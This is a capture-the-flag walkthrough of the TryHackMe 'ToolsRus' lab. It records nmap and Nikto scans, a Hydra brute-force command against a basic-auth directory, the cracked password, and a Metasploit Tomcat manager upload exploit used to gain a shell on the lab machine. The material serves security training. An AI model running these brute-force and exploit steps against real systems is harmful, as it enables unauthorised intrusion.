# ToolRUS

[ToolsRus](https://tryhackme.com/room/toolsrus)

## Enumeration

### Nmap Scan

```bash
┌──(root㉿kali)-[~]
└─# nmap -p- 10.10.91.232
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-11 11:35 UTC
Nmap scan report for ip-10-10-91-232.eu-west-1.compute.internal (10.10.91.232)
Host is up (0.0054s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13
MAC Address: 02:69:9E:A5:66:CD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.84 seconds
```

### Nmap -sV Scan

```bash
┌──(root㉿kali)-[~]
└─# nmap -p- 10.10.91.232 -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-11 11:37 UTC
Nmap scan report for ip-10-10-91-232.eu-west-1.compute.internal (10.10.91.232)
Host is up (0.00033s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
MAC Address: 02:69:9E:A5:66:CD (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
```

## What directory can you find, that begins with a "g"?

### Use Dirbuster

- Enter URL
- Enter Path to Wordlists (seclists/Discover/Web-Content/directory-list-medium)

```bash
dirbuster
```

![Dirbuster results](attachment:771001cb-c32b-4db8-8789-51953d97dd81:image.png)

**The answer is: guidelines**

## Whose name can you find from this directory?

After going to the browser and entering the URL + directory, below is the output:

![Guidelines directory](attachment:ad5472cc-9707-4840-8924-2c8834b66102:image.png)

## What directory has basic authentication?

Again go to the browser and test our the directories, but based on the name of the directory "Protected" it seems more likely to be protected with authentication.

Lets test this out:

![Protected directory](attachment:c7f2a843-d38a-43d0-8d11-28bedf940f9f:image.png)

## What is bob's password to the protected part of the website?

Its time to do some password cracking. So what do we have currently?

1. A username: Bob
2. URL of the password protected directory

Lets use Hydra to try and crack this authentication:

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.91.232 http-get "/protected/" -t 4 -V -f
```

And BOOM! we have the credentials as: **bubbles**

![Hydra cracking](attachment:082a9797-e668-4749-8f9e-2a5255773870:image.png)

## What other port that serves a webs service is open on the machine?

- Check Nmap Scan == **1234**

## What is the name and version of the software running on the port from question 5?

- Check nmap scan again with -A flag for complete scan: **Apache Tomcat/7.0.88**

![Nmap scan with version](attachment:c8359809-0a8a-4470-8715-f8624c7b9b67:image.png)

## Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above

```bash
nikto -h http://10.10.91.232:1234/manager/html -id <username>:<password> -o nikto_results.html -Format html
```

### How many documents

![Nikto results](attachment:e423406c-4557-46f4-8345-8ec8f645bd31:image.png)

### What is the server version?

```bash
┌──(root㉿kali)-[~]
└─# nikto -h http://10.10.91.232:80                                                                  
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.91.232
+ Target Hostname:    10.10.91.232
+ Target Port:        80
+ Start Time:         2025-10-11 11:47:26 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
```

## Use Metasploit to exploit the service and get a shell on the system

### Use Metasploit to exploit the service

1. Lets use the following exploit:

```bash
exploit/multi/http/tomcat_mgr_upload
```

2. Set the options:

```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS HttpUsername
RHOSTS => HttpUsername
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.91.232
RHOSTS => 10.10.91.232
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > run
```

### What user did you get a shell as?

![Shell user](attachment:0227778c-e23d-4a67-b562-af9752fb4a10:image.png)

### What flag is found in the root directory?

![Root flag 1](attachment:9e1ffbcc-c42c-4e7c-bd6d-22be7a6f4558:image.png)

![Root flag 2](attachment:05a41f6b-90c2-4244-bff7-39b117606c02:image.png)
